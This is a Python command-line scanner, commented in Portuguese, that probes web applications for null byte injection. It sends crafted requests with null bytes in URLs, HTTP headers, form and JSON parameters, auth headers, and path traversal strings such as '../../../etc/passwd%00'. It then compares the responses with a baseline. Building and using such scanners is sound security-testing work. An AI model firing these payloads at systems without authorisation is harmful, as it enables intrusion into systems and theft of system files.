#!/usr/bin/env python3
"""Modulo de testes de Null Byte Injection.

Testa se o servidor e vulneravel a injecao de null bytes (%00) em:
  - URLs (path, query params, extensao de arquivo)
  - Headers HTTP (User-Agent, Cookie, Authorization, Referer)
  - Parametros GET/POST
  - Path traversal (..%00, file%00.ext)
  - Auth bypass via null bytes

Fluxo:
  1. Envia requisicao baseline sem null bytes
  2. Envia requisicoes com null bytes em diferentes posicoes
  3. Compara respostas (status, tamanho, headers, corpo)
  4. Classifica cada tecnica: vulnerable, blocked, error
  5. Retorna resultado consolidado com severidade
"""
import argparse
import asyncio
import logging
from collections.abc import Awaitable
from dataclasses import asdict, dataclass
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    init_scanner,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.nullbyteinject")

_CATEGORY_MAP: dict[str, list[str]] = {
    "url": ["path_null", "query_null", "extension_null"],
    "header": ["ua_null", "cookie_null", "auth_null", "referer_null"],
    "param": ["get_null", "post_null", "json_null"],
    "traversal": ["path_traversal", "file_bypass", "double_null"],
    "auth": ["basic_null", "token_null", "session_null"],
}

_NULL_BYTES = ["%00", "\\x00", "\\0", "%0a%00", "%0d%00", "%00%0a"]

_BASELINE_EXTENSIONS = [".html", ".php", ".txt", ".jpg", ".png"]


@dataclass(frozen=True, slots=True)
class NullByteAttempt:
    """Tentativa individual de null byte injection."""

    technique: str
    category: str
    url: str
    payload: str
    status_baseline: int
    status_test: int
    size_baseline: int
    size_test: int
    status_changed: bool
    size_changed: bool
    vulnerable: bool
    details: str
    error: str


@dataclass(frozen=True, slots=True)
class NullByteResult:
    """Resultado consolidado do scan de null byte injection."""

    target: str
    baseline_status: int
    baseline_size: int
    tls: bool
    attempts: list[NullByteAttempt]
    vulnerable_techniques: list[str]
    blocked_techniques: list[str]
    issues: list[str]
    overall_status: str


def _build_baseline_url(url: str) -> str:
    """Constrói URL baseline para comparação."""
    parsed = urlparse(url)
    if not parsed.scheme:
        parsed = urlparse(f"http://{url}")
    return urlunparse(parsed)


def _build_null_url(url: str, null_byte: str, position: str) -> str:
    """Constrói URL com null byte injetado."""
    parsed = urlparse(url)
    if not parsed.scheme:
        parsed = urlparse(f"http://{url}")

    if position == "path":
        path = parsed.path.rstrip("/") + null_byte
        return urlunparse(parsed._replace(path=path))
    elif position == "query":
        params = parse_qs(parsed.query)
        params["test"] = [null_byte]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))
    elif position == "extension":
        path = parsed.path
        for ext in _BASELINE_EXTENSIONS:
            if ext in path:
                path = path.replace(ext, null_byte + ext)
                break
        else:
            path = path + null_byte
        return urlunparse(parsed._replace(path=path))
    return url


async def _test_baseline(client: httpx.AsyncClient, url: str) -> tuple[int, int, bytes]:
    """Envia requisicao baseline para obter resposta de referencia."""
    try:
        resp = await client.get(url, follow_redirects=False)
        return resp.status_code, len(resp.content), resp.content
    except httpx.RequestError:
        return 0, 0, b""


async def _test_null_in_url(
    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]
) -> list[NullByteAttempt]:
    """Testa null bytes em URLs."""
    attempts: list[NullByteAttempt] = []
    b_status, b_size, _ = baseline

    for null_byte in _NULL_BYTES:
        for position in ["path", "query", "extension"]:
            test_url = _build_null_url(url, null_byte, position)
            technique = f"null_url_{position}"

            try:
                resp = await client.get(test_url, follow_redirects=False)
                t_status = resp.status_code
                t_size = len(resp.content)
                status_changed = t_status != b_status
                size_changed = abs(t_size - b_size) > 50
                vulnerable = status_changed and t_status == 200

                attempts.append(NullByteAttempt(
                    technique=technique,
                    category="url",
                    url=test_url,
                    payload=null_byte,
                    status_baseline=b_status,
                    status_test=t_status,
                    size_baseline=b_size,
                    size_test=t_size,
                    status_changed=status_changed,
                    size_changed=size_changed,
                    vulnerable=vulnerable,
                    details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                    error="",
                ))
            except httpx.RequestError as exc:
                attempts.append(NullByteAttempt(
                    technique=technique,
                    category="url",
                    url=test_url,
                    payload=null_byte,
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(exc),
                ))

    return attempts


async def _test_null_in_headers(
    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]
) -> list[NullByteAttempt]:
    """Testa null bytes em headers HTTP."""
    attempts: list[NullByteAttempt] = []
    b_status, b_size, _ = baseline

    header_payloads = {
        "ua_null": ("User-Agent", f"Mozilla/5.0{chr(0)}Bot"),
        "cookie_null": ("Cookie", f"session=abc{chr(0)}def"),
        "auth_null": ("Authorization", f"Bearer token{chr(0)}"),
        "referer_null": ("Referer", f"https://example.com{chr(0)}/admin"),
    }

    for technique, (header_name, header_value) in header_payloads.items():
        try:
            resp = await client.get(url, headers={header_name: header_value}, follow_redirects=False)
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            size_changed = abs(t_size - b_size) > 50
            vulnerable = status_changed and t_status == 200

            attempts.append(NullByteAttempt(
                technique=technique,
                category="header",
                url=url,
                payload=header_value,
                status_baseline=b_status,
                status_test=t_status,
                size_baseline=b_size,
                size_test=t_size,
                status_changed=status_changed,
                size_changed=size_changed,
                vulnerable=vulnerable,
                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                error="",
            ))
        except httpx.RequestError as exc:
            attempts.append(NullByteAttempt(
                technique=technique,
                category="header",
                url=url,
                payload=header_value,
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                status_changed=False,
                size_changed=False,
                vulnerable=False,
                details="",
                error=str(exc),
            ))

    return attempts


async def _test_null_in_params(
    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]
) -> list[NullByteAttempt]:
    """Testa null bytes em parametros GET/POST."""
    attempts: list[NullByteAttempt] = []
    b_status, b_size, _ = baseline

    for null_byte in _NULL_BYTES[:3]:
        # GET param
        parsed = urlparse(url)
        base_url = urlunparse(parsed._replace(query=""))
        try:
            resp = await client.get(base_url, params={"q": f"test{null_byte}"}, follow_redirects=False)
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = status_changed and t_status == 200

            attempts.append(NullByteAttempt(
                technique="get_null",
                category="param",
                url=base_url,
                payload=f"q=test{null_byte}",
                status_baseline=b_status,
                status_test=t_status,
                size_baseline=b_size,
                size_test=t_size,
                status_changed=status_changed,
                size_changed=abs(t_size - b_size) > 50,
                vulnerable=vulnerable,
                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                error="",
            ))
        except httpx.RequestError as exc:
            attempts.append(NullByteAttempt(
                technique="get_null",
                category="param",
                url=base_url,
                payload=f"q=test{null_byte}",
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                status_changed=False,
                size_changed=False,
                vulnerable=False,
                details="",
                error=str(exc),
            ))

        # POST param
        try:
            resp = await client.post(base_url, data={"field": f"value{null_byte}"}, follow_redirects=False)
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = status_changed and t_status == 200

            attempts.append(NullByteAttempt(
                technique="post_null",
                category="param",
                url=base_url,
                payload=f"field=value{null_byte}",
                status_baseline=b_status,
                status_test=t_status,
                size_baseline=b_size,
                size_test=t_size,
                status_changed=status_changed,
                size_changed=abs(t_size - b_size) > 50,
                vulnerable=vulnerable,
                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                error="",
            ))
        except httpx.RequestError as exc:
            attempts.append(NullByteAttempt(
                technique="post_null",
                category="param",
                url=base_url,
                payload=f"field=value{null_byte}",
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                status_changed=False,
                size_changed=False,
                vulnerable=False,
                details="",
                error=str(exc),
            ))

        # JSON param
        try:
            resp = await client.post(
                base_url,
                json={"data": f"payload{null_byte}"},
                headers={"Content-Type": "application/json"},
                follow_redirects=False,
            )
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = status_changed and t_status == 200

            attempts.append(NullByteAttempt(
                technique="json_null",
                category="param",
                url=base_url,
                payload=f'{{"data": "payload{null_byte}"}}',
                status_baseline=b_status,
                status_test=t_status,
                size_baseline=b_size,
                size_test=t_size,
                status_changed=status_changed,
                size_changed=abs(t_size - b_size) > 50,
                vulnerable=vulnerable,
                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                error="",
            ))
        except httpx.RequestError as exc:
            attempts.append(NullByteAttempt(
                technique="json_null",
                category="param",
                url=base_url,
                payload=f'{{"data": "payload{null_byte}"}}',
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                status_changed=False,
                size_changed=False,
                vulnerable=False,
                details="",
                error=str(exc),
            ))

    return attempts


async def _test_path_traversal(
    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]
) -> list[NullByteAttempt]:
    """Testa path traversal com null bytes."""
    attempts: list[NullByteAttempt] = []
    b_status, b_size, _ = baseline

    traversal_payloads = [
        ("..%00.html", "path_traversal"),
        ("..%00/", "path_traversal"),
        ("../../../etc/passwd%00", "path_traversal"),
        ("..%2500.html", "file_bypass"),
        ("%00.html", "file_bypass"),
        ("test%00.php", "file_bypass"),
        ("..%00..%00/", "double_null"),
        ("%00%00.html", "double_null"),
    ]

    parsed = urlparse(url)
    base_path = parsed.path.rstrip("/")

    for payload, technique in traversal_payloads:
        test_url = urlunparse(parsed._replace(path=f"{base_path}/{payload}"))
        try:
            resp = await client.get(test_url, follow_redirects=False)
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = status_changed and t_status == 200

            attempts.append(NullByteAttempt(
                technique=technique,
                category="traversal",
                url=test_url,
                payload=payload,
                status_baseline=b_status,
                status_test=t_status,
                size_baseline=b_size,
                size_test=t_size,
                status_changed=status_changed,
                size_changed=abs(t_size - b_size) > 50,
                vulnerable=vulnerable,
                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                error="",
            ))
        except httpx.RequestError as exc:
            attempts.append(NullByteAttempt(
                technique=technique,
                category="traversal",
                url=test_url,
                payload=payload,
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                status_changed=False,
                size_changed=False,
                vulnerable=False,
                details="",
                error=str(exc),
            ))

    return attempts


async def _test_auth_bypass(
    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]
) -> list[NullByteAttempt]:
    """Testa auth bypass via null bytes."""
    attempts: list[NullByteAttempt] = []
    b_status, b_size, _ = baseline

    auth_payloads = [
        ("basic_null", "Authorization", f"Basic YWRtaW46cGFzc3dvcmQ{chr(0)}"),
        ("token_null", "X-Auth-Token", f"abc123{chr(0)}"),
        ("session_null", "Cookie", f"PHPSESSID=abc{chr(0)}def"),
    ]

    for technique, header_name, header_value in auth_payloads:
        try:
            resp = await client.get(url, headers={header_name: header_value}, follow_redirects=False)
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = status_changed and t_status == 200

            attempts.append(NullByteAttempt(
                technique=technique,
                category="auth",
                url=url,
                payload=header_value,
                status_baseline=b_status,
                status_test=t_status,
                size_baseline=b_size,
                size_test=t_size,
                status_changed=status_changed,
                size_changed=abs(t_size - b_size) > 50,
                vulnerable=vulnerable,
                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                error="",
            ))
        except httpx.RequestError as exc:
            attempts.append(NullByteAttempt(
                technique=technique,
                category="auth",
                url=url,
                payload=header_value,
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                status_changed=False,
                size_changed=False,
                vulnerable=False,
                details="",
                error=str(exc),
            ))

    return attempts


async def scan_null_byte(
    url: str,
    timeout: float = 10.0,
    user_agent: str | None = None,
    proxy: str | None = None,
    verify: bool = False,
    category: str | None = None,
    concurrency: int = 5,
) -> NullByteResult:
    """Executa scan de null byte injection contra a URL alvo."""
    parsed = urlparse(url)
    if not parsed.scheme:
        url = f"http://{url}"
        parsed = urlparse(url)

    tls = parsed.scheme == "https"

    async with create_async_client(
        user_agent=user_agent or "MyTools/nullbyte",
        proxy=proxy,
        timeout=timeout,
        verify=verify,
    ) as client:
        b_status, b_size, _ = await _test_baseline(client, url)
        baseline = (b_status, b_size, b"")

        sem = asyncio.Semaphore(concurrency)

        async def _limited(coro: Awaitable[object]) -> object:
            async with sem:
                return await coro

        tasks: list[Awaitable[object]] = []
        selected = _CATEGORY_MAP.get(category, []) if category else []

        if not category or category == "url":
            tasks.append(_limited(_test_null_in_url(client, url, baseline)))
        if not category or category == "header":
            tasks.append(_limited(_test_null_in_headers(client, url, baseline)))
        if not category or category == "param":
            tasks.append(_limited(_test_null_in_params(client, url, baseline)))
        if not category or category == "traversal":
            tasks.append(_limited(_test_path_traversal(client, url, baseline)))
        if not category or category == "auth":
            tasks.append(_limited(_test_auth_bypass(client, url, baseline)))

        if category and not selected:
            return NullByteResult(
                target=url,
                baseline_status=b_status,
                baseline_size=b_size,
                tls=tls,
                attempts=[],
                vulnerable_techniques=[],
                blocked_techniques=[],
                issues=[f"Categoria desconhecida: {category}"],
                overall_status="error",
            )

        results = await asyncio.gather(*tasks, return_exceptions=True)
        all_attempts: list[NullByteAttempt] = []
        for r in results:
            if isinstance(r, list):
                all_attempts.extend(r)

    vulnerable: list[str] = []
    blocked: list[str] = []
    issues: list[str] = []

    seen: set[str] = set()
    for att in all_attempts:
        if att.technique not in seen:
            seen.add(att.technique)
            if att.vulnerable:
                vulnerable.append(att.technique)
            elif att.status_changed:
                blocked.append(att.technique)

    if vulnerable:
        issues.append(f"{len(vulnerable)} tecnicas de null byte inject vulneraveis")
    if blocked:
        issues.append(f"{len(blocked)} tecnicas bloqueadas pelo servidor")

    overall = "vulnerable" if vulnerable else "blocked" if blocked else "secure"

    return NullByteResult(
        target=url,
        baseline_status=b_status,
        baseline_size=b_size,
        tls=tls,
        attempts=all_attempts,
        vulnerable_techniques=vulnerable,
        blocked_techniques=blocked,
        issues=issues,
        overall_status=overall,
    )


def print_results(result: NullByteResult) -> None:
    """Exibe os resultados do scan formatados."""
    print()
    print(color("=" * 60, Cyber.CYAN))
    print(color("  NULL BYTE INJECTION SCAN", Cyber.CYAN))
    print(color("=" * 60, Cyber.CYAN))
    print(color(f"  Target: {result.target}", Cyber.WHITE))
    print(color(f"  Baseline: {result.baseline_status} ({result.baseline_size} bytes)", Cyber.GRAY))
    print(color(f"  TLS: {'Sim' if result.tls else 'Nao'}", Cyber.GRAY))

    status_color = Cyber.RED if result.overall_status == "vulnerable" else Cyber.GREEN
    print(color(f"\n  Status: {result.overall_status.upper()}", status_color))

    if result.vulnerable_techniques:
        print(color("\n  [VULNERAVEL]", Cyber.RED))
        for tech in result.vulnerable_techniques:
            print(color(f"    - {tech}", Cyber.RED))

    if result.blocked_techniques:
        print(color("\n  [BLOQUEADO]", Cyber.GREEN))
        for tech in result.blocked_techniques:
            print(color(f"    - {tech}", Cyber.GREEN))

    if result.issues:
        print(color("\n  Observacoes:", Cyber.YELLOW))
        for issue in result.issues:
            print(color(f"    - {issue}", Cyber.YELLOW))

    print(color("=" * 60, Cyber.CYAN))


def build_parser() -> argparse.ArgumentParser:
    """Constrói o parser de argumentos CLI."""
    parser = argparse.ArgumentParser(
        prog="mytools-nullbyte",
        description="Null Byte Injection — testa injecao de null bytes em URLs, headers e parametros.",
    )
    add_common_args(parser)
    parser.add_argument("url", nargs="?", help="URL alvo para teste")
    parser.add_argument(
        "-c", "--category",
        choices=list(_CATEGORY_MAP.keys()),
        help="Categoria de teste (url, header, param, traversal, auth)",
    )
    parser.add_argument(
        "--concurrency",
        type=int,
        default=5,
        help="Numero de requisicoes simultaneas (default: 5)",
    )
    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan unico e retorna codigo de saida."""
    init_scanner(args)
    url = getattr(args, "url", None) or getattr(args, "target", None)
    if not url:
        print(color("Especifique uma URL alvo.", Cyber.RED))
        return 1

    result = safe_asyncio_run(
        scan_null_byte(
            url=url,
            timeout=getattr(args, "timeout", 10.0),
            user_agent=getattr(args, "user_agent", None),
            proxy=getattr(args, "proxy", None),
            verify=getattr(args, "verify", False),
            category=getattr(args, "category", None),
            concurrency=getattr(args, "concurrency", 5),
        )
    )
    print_results(result)

    output_path = getattr(args, "output", None)
    if output_path:
        write_output(output_path, asdict(result))
        print(color(f"\nResultados salvos em: {output_path}", Cyber.GREEN))

    return 0 if result.overall_status != "error" else 1


banner_art = create_banner(
    r"""
     _   _                      _____             _
    | \ | |                    |_   _|           | |
    |  \| | _____  ___   _  _    | | ___  _ __ | |_
    | . ` |/ _ \ \/ / | | || |   | |/ _ \| '_ \| __|
    | |\  |  __/>  <| |_| || |   | | (_)| | | | |_
    |_| \_|\___/_/\_\\__,_||_|   \_/\___|_| |_|\__|

    """,
    "Null Byte Injection — detecta injecao de null bytes em web apps",
)


def main() -> int:
    """Ponto de entrada principal do CLI."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(getattr(a, "url", None) or getattr(a, "target", None)),
        prompt="nullbyte> ",
        description="Null Byte Injection interativo.",
        example="https://target.com -c url",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com\n"
            "  https://target.com -c url\n"
            "  https://target.com -c header --proxy http://127.0.0.1:8080\n"
            "  https://target.com -c traversal --timeout 15"
        ),
    )
